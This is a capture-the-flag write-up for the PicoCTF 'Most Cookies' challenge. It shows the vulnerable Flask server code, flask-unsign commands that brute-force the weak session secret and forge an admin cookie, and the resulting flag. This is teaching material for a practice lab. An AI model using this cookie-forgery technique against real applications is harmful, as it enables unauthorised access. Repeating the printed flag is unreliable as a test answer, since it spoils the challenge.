# PicoCTF Most Cookies

This is a fairly simple web challenge from PicoCTF 2021 (iirc)

We get access to a web page with what seems to be search functionality, and we see that we have access to the server's backend code, which is stored in a file called `server.py`. It's source is as follows:

```py
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()
```

There are 2 main takeaways from this...
 - The app's secret key is randomly chosen from a short list of known values, this can be brute forced in seconds with very little effort.
 - We need to change the value of the `very_auth` key in the cookie from `"blank"` to `"admin"`, and we should have access to the flag

To brute force the cookie's secret, we can use a tool called [flask-unsign](https://pypi.org/project/flask-unsign/) which can be installed through pip. 

The content of my session cookie was `eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YOCbHA.nawf7Joe6wcigUbARIyaIUOWoSA`. I copied all of the values from the list `cookie_names` and stored them inside a file called `cookie_names.txt`
and then brute-forced the secret using the command `flask-unsign --unsign -c "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YOCbHA.nawf7Joe6wcigUbARIyaIUOWoSA" --wordlist ./cookie_names.txt` Which gave the following output...

```bash
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'butter' 
```

Now that we know the secret key, as well as what the session cookie decodes to, we can simply change the value of `"very_auth"` to `"admin"` and sign the cookie ourselves:

`flask-unsign -s -c "{'very_auth': 'admin'}" --secret 'butter'`, which gives us a value of `eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YOCcZw.KjTQ7xLf7wgaarXArDsWsF3218g` for our session cookie.

Going back to the website, change our session cookie to the previously signed value and we get the flag :) 

`picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}`
